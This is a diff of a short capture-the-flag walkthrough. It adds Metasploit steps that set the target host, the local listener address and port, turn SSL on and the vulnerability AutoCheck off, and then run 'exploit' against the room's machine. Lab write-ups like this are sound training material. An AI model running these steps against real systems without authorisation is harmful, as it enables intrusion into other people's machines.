@@ -64,9 +64,19 @@ as we can see it dont give us full details On the Open Ports so we will again us
 ### • 12. Now we gotta see what informations are required to be filed to usee this sploit for tht we wioll use:
     show options 
 
-### • 13. Now fill all the reuired infos
+### • 13. Now fill all the required infos
     set RHOSTS >the ip that was given by the room<
 
     set LHOST >the ip of ur vpn/tun0<
 
     set LPORT >the port u wanna use for this operation(tht port should be free/not alredy in use)<
+  
+  Also set SSL to true and AutoCheck false
+  
+    set SSL true 
+
+    set AutoCheck false
+  
+ And BOOOOM! use ***exploit***
+     
+    exploit
